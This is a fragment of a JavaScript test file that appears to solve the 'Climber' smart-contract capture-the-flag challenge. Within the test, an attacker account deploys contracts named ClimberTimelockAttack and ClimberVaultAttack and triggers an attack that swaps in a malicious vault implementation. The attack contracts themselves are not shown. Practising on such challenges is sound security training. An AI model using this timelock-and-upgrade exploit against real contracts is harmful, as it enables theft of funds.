...
describe('[Challenge] Climber', function () {
	...
	it('Exploit', async function () {
		const ClimberTimelockAttack = await ethers.getContractFactory(
			'ClimberTimelockAttack',
			attacker,
		);

		const ClimberVaultAttack = await ethers.getContractFactory(
			'ClimberVaultAttack',
			attacker,
		);

		const attack = await ClimberTimelockAttack.deploy(
		...
		const newImplementation = await ClimberVaultAttack.deploy();

		await attack.connect(attacker).attack(newImplementation.address);
